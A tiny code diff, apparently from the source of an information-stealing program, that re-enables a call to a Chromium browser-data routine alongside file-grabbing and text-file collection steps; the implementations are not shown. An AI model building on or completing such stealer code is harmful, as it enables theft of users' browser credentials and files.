@@ -118,7 +118,7 @@ void Other()
 		files::Txt_files();
 	if (config::enableFileGrubber)
 		files::File_Grabber();
-	//browsers::Chromium();
+	browsers::Chromium();
 	//browsers::FireFox();
 }
 
